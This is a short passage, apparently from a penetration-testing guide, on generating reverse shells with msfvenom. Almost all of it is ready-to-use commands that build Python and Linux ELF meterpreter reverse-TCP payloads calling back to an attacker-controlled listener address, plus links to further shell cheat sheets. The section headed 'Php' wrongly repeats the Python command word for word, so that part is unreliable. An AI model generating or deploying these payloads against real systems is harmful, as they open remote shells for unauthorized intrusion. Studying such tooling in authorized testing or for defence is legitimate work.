# Creating reverse-shells


In the chapter Basics I linked to some reverse shells. Another way to create reverse shells is by using msfvenom.

Here is a good list for creating shells with msfvenom. 
http://netsec.ws/?p=331
https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/

## Python

```
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5555 > python_meterpter_reverse_tcp.py
```

## Php

```
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5555 > python_meterpter_reverse_tcp.py
```

## Linux elf

This one has worked great for me.
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
```